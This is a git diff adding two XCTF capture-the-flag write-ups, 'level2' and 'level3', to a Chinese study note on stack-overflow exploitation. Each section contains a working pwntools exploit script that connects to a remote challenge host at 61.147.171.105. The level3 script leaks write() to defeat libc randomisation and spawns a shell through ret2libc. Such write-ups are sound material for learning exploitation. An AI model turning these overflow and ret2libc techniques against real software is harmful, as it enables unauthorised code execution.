@@ -268,6 +268,27 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
+### xctf-level2
+
+同类型题目:
+
+exp:
+
+``` python
+from pwn import *
+
+#sh = process('./level2')
+sh = remote('61.147.171.105', 55754)
+
+system = 0x8048320
+binsh = 0x804A024
+
+payload = flat([b'a' * (0x88+4), system, b'a' * 4, binsh])
+
+sh.sendline(payload)
+sh.interactive()
+```
+
 ## ret2libc
 
 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。
@@ -435,4 +456,58 @@ sh.interactive()
 
 这里我选择泄露get函数:
 
-1. 
+
+
+
+#### xctf-level3
+
+题目给了二进制程序和libc文件,在`vulnerable_function()`中存在栈溢出,动调得溢出0x88+4字节到ret.
+
+``` c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+
+  write(1, "Input:\n", 7u);
+  return read(0, buf, 0x100u);
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function();
+  write(1, "Hello, World!\n", 0xEu);
+  return 0;
+}
+```
+
+通过泄露`write()`的地址计算出system和"/bin/sh"字符串的真实地址.
+
+exp:
+
+``` python
+from pwn import *
+
+#sh = process("./level3")
+sh = remote("61.147.171.105",56935)
+
+elf = ELF("./level3")
+libc = ELF("./libc_32.so.6")
+
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+main_addr = elf.sym['main']
+
+sh.recvuntil(":\n")
+payload1 = flat([b'a' * (0x88+4), write_plt, main_addr, 1, write_got, 0x4])
+sh.sendline(payload1)
+write_real = u32(sh.recv(4))
+
+libc_base = write_real - libc.sym['write']
+
+system_real = libc_base + libc.sym['system']
+binsh_real = libc_base + 0x15902b
+
+payload2 = flat([b'a' * (0x88+4), system_real, b'a' * 4, binsh_real])
+sh.sendlineafter(":\n", payload2)
+sh.interactive()
+```
